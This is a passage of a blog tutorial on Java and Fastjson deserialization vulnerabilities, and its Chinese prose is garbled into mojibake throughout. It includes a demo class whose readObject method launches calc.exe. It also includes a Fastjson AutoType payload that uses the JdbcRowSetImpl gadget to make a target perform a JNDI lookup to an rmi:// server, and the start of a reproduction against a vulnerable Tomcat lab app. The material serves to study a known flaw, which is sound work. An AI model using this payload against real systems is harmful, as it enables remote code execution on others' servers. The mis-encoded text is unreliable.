<h1 id="Fastjsonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#Fastjsonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="Fastjsonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>Fastjsonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1><h2 id="å¸¸è§„ååºåˆ—åŒ–"><a href="#å¸¸è§„ååºåˆ—åŒ–" class="headerlink" title="å¸¸è§„ååºåˆ—åŒ–"></a>å¸¸è§„ååºåˆ—åŒ–</h2><p>Fastjsonçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ä¸å¸¸è§„çš„javaååºåˆ—åŒ–ä¸åŒï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹æ­£å¸¸çš„javaååºåˆ—åŒ–ï¼Œä½¿ç”¨ä¸‹é¢ä¸€æ®µä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Unserilize.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æ–°å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">            <span class="type">UnserializeTest</span> <span class="variable">unserializeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnserializeTest</span>();</span><br><span class="line">            unserializeTest.name = <span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            outputStream.writeObject(unserializeTest);</span><br><span class="line">            outputStream.close();</span><br><span class="line"><span class="comment">//            fileOutputStream.close();</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">UnserializeTest</span> <span class="variable">o</span> <span class="operator">=</span> (UnserializeTest) objectInputStream.readObject();</span><br><span class="line">                System.out.println(o.name);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnserializeTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;æ‰§è¡Œäº†readObjectå‡½æ•°ï¼ï¼&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<blockquote>
<p>ååºåˆ—åŒ–çš„å•è¯è¢«æˆ‘æ‹¼é”™äº†ï¼Œå°´å°¬ï¼Œæ‡’å¾—æ”¹äº†</p>
</blockquote>
<p>æˆ‘ä»¬çŸ¥é“åœ¨javaä¸­è¦å®ç°åºåˆ—åŒ–çš„ç±»çš„çš„å®ä¾‹ï¼Œå…¶ç±»å¿…é¡»å®ç°Serializableæˆ–è€…Externalizableæ¥å£ï¼ŒSerializableæ¥å£æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œå…¶åªæ˜¯ä½œä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œè€ŒExternalizableè¿™æ˜¯å¯¹Serializableæ¥å£çš„å†ä¸€æ¬¡å°è£…ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<ul>
<li>Serializableæ¥å£<br><img src="https://i-blog.csdnimg.cn/blog_migrate/07de0133c7b3f58fdb4e11e6552128b8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li>
<li>Externalizableæ¥å£<br><img src="https://i-blog.csdnimg.cn/blog_migrate/212c7e8b414b9efadc307060d698e207.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°Externalizableç»§æ‰¿äº†Serializableæ¥å£ï¼Œå¹¶æ·»åŠ äº†è‡ªå·±çš„æ–¹æ³•ã€‚<br>å› ä¸ºè¿™ä¸ªåŸå› ï¼Œæˆ‘ä»¬åœ¨demoä¸­é¦–å…ˆç¼–å†™äº†ä¸€ä¸ªUnserializeTestç±»ç”¨äºè¢«åºåˆ—åŒ–ï¼Œè¯¥ç±»ä¸­é‡å†™äº†readObjectæ–¹æ³•ï¼Œä¸ªäººæ„Ÿè§‰ä¹Ÿä¸ç®—æ˜¯é‡å†™ï¼Œå› ä¸ºæ²¡æœ‰@overrideæ³¨è§£ï¼Œåº”è¯¥æ˜¯åº”ä¸ºä½œç”¨åŸŸçš„ç¼˜æ•…å¯¼è‡´åœ¨è°ƒç”¨çš„æ—¶å€™å…ˆåªèƒ½æ‰§è¡Œäº†æœ¬ç±»ä¸­çš„readObjectæ–¹æ³•ï¼Œåœ¨è¯¥ç±»ä¸­æˆ‘ä»¬æ‰§è¡Œäº†æ“ä½œç³»ç»Ÿå‘½ä»¤å¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œå¹¶æ‰“å°äº†ä¸€æ®µè¯ã€‚<br>demoä»£ç è¿è¡Œçš„ç»“æœå°±æ˜¯ï¼Œä¼šåœ¨æ§åˆ¶å°æ‰“å°ï¼š</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">æ‰§è¡Œäº†readObjectå‡½æ•°ï¼ï¼</span></span><br><span class="line"><span class="string">armandhe</span></span><br></pre></td></tr></table></figure>
<p>å¹¶ç”Ÿæˆä¸€ä¸ªUserilize.txtæ–‡ä»¶å’Œå¼¹å‡ºè®¡ç®—æœºï¼Œå¦‚ä¸‹å›¾ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5cacf695b502f8230904fb0374ca5a4c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬é€šè¿‡å¸¸è§„çš„æ–¹å¼æ‰“å¼€Unserilize.txtä¼šçœ‹åˆ°ä¸€å †ä¹±ç ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/41d8629728724b938a6fcdbe4839f1b8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨linuxçš„xxdå‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xxd Unserilize.txt</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…åœ¨windowsä¸­ä½¿ç”¨010editoræ‰“å¼€å®ƒï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f9292c92bd8d12b06758601d1ac4f7c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>éœ€è¦æ³¨æ„çš„ç‰¹å¾æ˜¯ï¼Œå¼€å¤´çš„ACED0005ï¼Œè¿™ä¸ªæ˜¯javaåºåˆ—åŒ–æ•°æ®çš„ç‰¹å¾ï¼Œæœ‰åŠ©äºæˆ‘ä»¬å¿«é€Ÿå®šä½ç¨‹åºçš„ååºåˆ—åŒ–åˆ©ç”¨ç‚¹ã€‚å…¶å®åé¢çš„73 72ä¹Ÿæœ‰ç‰¹å®šçš„å«ä¹‰ï¼Œä¸è¿‡å…·ä½“çš„æˆ‘å¿˜è®°äº†ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å·¥å…·å¯¹è¯¥æ•°æ®è¿›è¡Œè§£æï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/407450606885d51de67358e3bcf93471.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°å¯¹è±¡åºåˆ—åŒ–ä¹‹å‰å¯¹åº”çš„ç±»ï¼Œä»¥åŠå…¶ä¸­å…¶ä¸­çš„å¯è¢«åºåˆ—åŒ–çš„methodsä¸fieldsã€‚<br>å¸¸è§„javaåºåˆ—åŒ–è°ƒç”¨çš„æ˜¯writeObjectæ–¹æ³•ï¼Œååºåˆ—åŒ–åˆ™è°ƒç”¨çš„æ˜¯readObjectæ–¹æ³•ï¼Œå¦‚æœç›®æ ‡ç±»åœ¨å®ç°çš„æ—¶å€™é‡å†™äº†readObjectæ–¹æ³•æƒ³æˆ‘ä»¬çš„demoä»£ç ä¸€æ ·ï¼Œå¹¶åŒ…å«æœ‰ä¸€äº›å±é™©çš„æ“ä½œçš„å‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„è¯ï¼Œé‚£ä¹ˆå°±å¯èƒ½å¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h2 id="Fastjsonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–-1"><a href="#Fastjsonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–-1" class="headerlink" title="Fastjsonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>Fastjsonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p>Fastjsonå¯ä»¥å°†JSONObjectæˆ–è€…javaBeanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ã€‚å…³äºjavaBeançš„åªæ˜¯å¯ä»¥å‚è€ƒå»–é›ªå³°çš„ç½‘ç«™ï¼š<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">javaBeanæ˜¯ä»€ä¹ˆ</a></p>
<p>Fastjsonåœ¨å¯¹javaBeanè¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨å®ƒçš„æ‰€æœ‰getæˆ–è€…isæ–¹æ³•ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨æ‰€æœ‰çš„setæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸‹é¢çš„ä»£ç ï¼Œå¦‚æœè¿™ä¸ªsetæ–¹æ³•ä¸­å«æœ‰ä¸€äº›å±é™©çš„è°ƒç”¨é“¾ï¼Œæˆ‘ä»¬åˆ™å¯ä»¥åˆ©ç”¨è¿™ä¸ªååºåˆ—åŒ–è¿‡ç¨‹æ¥æ‰§è¡Œæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤ï¼š<br>é¦–å…ˆæˆ‘ä»¬å‡†å¤‡ä¸€ä¸ªjavaBeanï¼ŒFastjsonUnserilizeTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†getnameæ–¹æ³•ï¼&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†setnameæ–¹æ³•ï¼&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†getageæ–¹æ³•ï¼&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†setageæ–¹æ³•ï¼&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ä»£ç ,FastjsonUnserilizeMain.javaï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ–°å»ºå¯¹è±¡</span></span><br><span class="line">        System.out.println(<span class="string">&quot;æ–°å»ºå¯¹è±¡ï¼š&quot;</span>);</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line">        fastjsonUnserilizeTest.setName(<span class="string">&quot;armband&quot;</span>);</span><br><span class="line">        fastjsonUnserilizeTest.setAge(<span class="number">24</span>);</span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\nåºåˆ—åŒ–ï¼š&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\nååºåˆ—åŒ–ï¼š&quot;</span>);</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest1</span> <span class="operator">=</span> JSON.parseObject(s, FastjsonUnserilizeTest.class);</span><br><span class="line">        System.out.println(fastjsonUnserilizeTest1);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fastjsonUnserilizeTest1.getName();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œåæ§åˆ¶æ§åˆ¶å°æ‰“å°ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e04a4f51c024bbfa1ca69f40ba0493cb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¬¬ä¸€éƒ¨åˆ†æ˜¯åœ¨æˆ‘ä»¬æ–°å»ºå¯¹è±¡çš„æ—¶å€™è°ƒç”¨äº†ä¸¤æ¬¡setæ–¹æ³•<br>ç¬¬äºŒéƒ¨åˆ†æ˜¯åœ¨åºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨äº†getæ–¹æ³•<br>ç¬¬ä¸‰éƒ¨åˆ†æ˜¯åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨äº†setæ–¹æ³•<br>æ³¨æ„åˆ°Fastjsonä¸­åºåˆ—åŒ–è°ƒç”¨çš„æ˜¯JSON.toJSONStringæ–¹æ³•ï¼Œååºåˆ—åŒ–è°ƒç”¨çš„æ˜¯JSON.parseObjectæ–¹æ³•ã€‚</p>
<h1 id="Fastjsonå‘åºåˆ—åŒ–æ¼æ´åŸç†"><a href="#Fastjsonå‘åºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="Fastjsonå‘åºåˆ—åŒ–æ¼æ´åŸç†"></a>Fastjsonå‘åºåˆ—åŒ–æ¼æ´åŸç†</h1><p>æˆ‘ä»¬æ³¨æ„åˆ°åœ¨è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„æ—¶å€™JSON.toJSONStringæ–¹æ³•æœ‰ä¸€ä¸ªå‚æ•°SerializerFeature.WriteClassNameï¼Œè¿™ä¸ªå‚æ•°å°±æ˜¯åœ¨åºåˆ—åŒ–æ˜¯åŒ…å«ç±»åï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå‚æ•°å¯¼è‡´äº†Fastjsonçš„ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™ä¸ªå‚æ•°å®ç°çš„åŠŸèƒ½åœ¨Fastjsonä¸­è¢«ç§°ä½œAutoTypeï¼Œå³è‡ªåŠ¨ç±»å‹ã€‚å¦‚æœä¸æ·»åŠ è¿™ä¸ªå‚æ•°æˆ‘ä»¬çš„javaBeanåºåˆ—åŒ–ååº”è¯¥æ˜¯è¿™æ ·çš„ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ded9132a1e351e460033a0f6271c6baa.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯¹æ¯”ä¸€ä¸‹åŒ…å«æœ‰ä¸Šè¿°å‚æ•°ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10feefd1c9ed9c4ffa16560dfddd199b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°å¤šäº†ä¸€ä¸ª@typeå‚æ•°ã€‚<br>å¦‚æœæ²¡æœ‰SerializerFeature.WriteClassNameå‚æ•°ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä»£ç è¿™æ ·å†™ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s= <span class="string">&quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶å€™æˆ‘ä»¬æ˜¯ä¸èƒ½æ§åˆ¶åˆ°åº•è¦ååºåˆ—åŒ–ä¸ºä»€ä¹ˆç±»å‹çš„å¯¹è±¡çš„ï¼Œåªèƒ½å¼€å‘è€…åœ¨ä»£ç ä¸­æŒ‡å®šå¥½ï¼Œå¦‚è¿™æ ·ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/21ae2fde7d3075a1f2e5479f21fe8053.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è€Œå¦‚æœæˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™æ·»åŠ äº†è¯¥å‚æ•°ï¼Œæˆ‘ä»¬åˆ™å¯ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™é€šè¿‡æ§åˆ¶@typeé”®çš„å€¼æ¥æ§åˆ¶è¯¥åºåˆ—åŒ–æ•°æ®è¦è¢«ååºåˆ—åŒ–ä¸ºä»€ä¹ˆæ ·çš„å¯¹è±¡ï¼Œå³è°ƒç”¨ä»€ä¹ˆç±»çš„set æ–¹æ³•ï¼Œæ¥ä¸‹æ¥è¦ç”¨åˆ°çš„å°±æ˜¯æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªç±»å¯ä»¥è¢«ç”¨æ¥å®Œæˆæˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ã€‚<br>å…¶ä¸­ä¸€ä¸ªç±»æ˜¯ï¼šcom.sun.rowset.JdbcRowSetImpl<br>æˆ‘ä»¬æŸ¥çœ‹ä»¥ä¸‹è¿™ä¸ªç±»ï¼Œå®šä½åˆ°setDataSourceæ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a2966598772acdc06ae5b39e34722680.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™æ®µä»£ç é¦–å…ˆåˆ¤æ–­äº†this.getDataSourceNameï¼ˆï¼‰æ˜¯å¦ä¸ºç©ºï¼Œæˆ‘ä»¬å®šä½åˆ°getDataSourceNameï¼ˆï¼‰æ–¹æ³•å¤„æŸ¥çœ‹ä¸€ä¸‹ä»–çš„è¿”å›å€¼ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/87dc01881a8358a40c7bfe72f7d5fcf1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿”å›dataSourceï¼Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ååºåˆ—åŒ–è°ƒç”¨setæ–¹æ³•æ—¶dataSourceé¦–å…ˆæ˜¯æ²¡æœ‰å€¼çš„ï¼Œä¹Ÿå°±æ˜¯è¯´this.getDataSourceNameï¼ˆï¼‰çš„è¿”å›å€¼ä¸ºnullï¼Œè¿™é€»è¾‘è¿›å…¥åˆ°elseéƒ¨åˆ†ï¼Œè°ƒç”¨äº†çˆ¶ç±»çš„setDataSourceNameï¼Œå¹¶å°†var1ä¼ äº†è¿›å»ã€‚å…¶å®è¿™ä¸€ä¸²éƒ½ä¸é‡è¦ï¼Œåªéœ€è¦çŸ¥é“ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨setDataSourceNameä¸ºDataSourceNameèµ‹å€¼å°±å¯ä»¥äº†ã€‚<br>å†åœ¨com.sun.rowset.JdbcRowSetImplç±»ä¸­å®šä½åˆ°setAutocommitæ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8ee66d941bcb77f16736b104d5f7c0fb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨å®šä½åˆ°this.connectæ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b8ade61e0a47e61d179d1ac8b336e53e.png"><br>åœ¨è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°æœ‰ä¸ªlookupæ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°±æ˜¯JNDIä¸­è®¿é—®è¿œç¨‹æœåŠ¡å™¨è·å–è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ï¼Œå…¶å‚æ•°ä¸ºæœåŠ¡å™¨åœ°å€ã€‚å¦‚æœå…¶å‚æ•°å¯æ§é‚£ä¹ˆå°±å¯èƒ½è¢«æ”»å‡»ï¼Œè€Œthis.getDataSourceNameæ˜¯è·å–DataSourceNameçš„å€¼å¾—æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ§åˆ¶äº†this.setDataSourceNameæ–¹æ³•çš„å‚æ•°å°±å¯ä»¥è®¿é—®æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨äº†ã€‚è€Œæˆ‘ä»¬çŸ¥é“Fastjsonåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨æ‰€æœ‰çš„setæ–¹æ³•ï¼Œæ­£å¥½å¯ä»¥é€šè¿‡setDataSourceNameå¯¹DataSourceNameè¿›è¡Œèµ‹å€¼ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬å°±æœ‰äº†è¿™æ ·çš„Fastjsonåºåˆ—åŒ–æ•°æ®ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://localhost:1099/POC&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>è¿™å„¿autoCommitå¥½åƒå¿…é¡»è®¾ç½®ä¸ºtrueï¼Œä¸ºå•¥æˆ‘å¿˜è®°äº†ï¼Œæ˜¨å¤©çœ‹çš„ï¼Œå¾…ä¼šå„¿å»æ‰¾æ‰¾ï¼ï¼<br>æ¼æ´çš„åŸç†å°±æ˜¯è¿™æ ·ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¤ç°äº†ï¼Œå¥½ç´§å¼ ã€‚ã€‚ã€‚ã€‚</p>
<h1 id="ä¸€æ¬¡å¤±è´¥çš„å¤ç°"><a href="#ä¸€æ¬¡å¤±è´¥çš„å¤ç°" class="headerlink" title="ä¸€æ¬¡å¤±è´¥çš„å¤ç°"></a>ä¸€æ¬¡å¤±è´¥çš„å¤ç°</h1><p>æˆ‘ä»¬åˆ©ç”¨ç°æœ‰çš„é¶åœºç¯å¢ƒï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f1837d42ed28a8665c28ff8a57ee392.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†å«æœ‰æ¼æ´çš„waråŒ…ç›´æ¥æ”¾åˆ°tomcatçš„webappsç›®å½•ä¸‹ï¼Œç„¶åå¯åŠ¨tomcatå°±å¯ä»¥äº†ï¼Œè®¿é—®ä¸‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/efdb2e55d3a0a078768e9bb6da82d399.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‡ºå•Šå…ˆhellowordåˆ™ä»£è¡¨é¶åœºæ­å»ºå®Œæ¯•ï¼Œç„¶åæˆ‘ä»¬å»çœ‹çœ‹è¿™ä¸ªwaråŒ…æ€ä¹ˆå†™çš„ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7b75e64d29cf5cdfbb7d971f319d98d2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸»è¦çš„é€»è¾‘åœ¨è¿‡æ»¤å™¨é‚£ä¸ªç±»ä¸­ï¼Œæˆ‘ç›´æ¥ç»™ä»–ç²˜å‡ºæ¥ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> spark.Spark;</span><br><span class="line"><span class="keyword">import</span> spark.servlet.SparkApplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexFilter</span> <span class="keyword">implements</span> <span class="title class_">SparkApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title 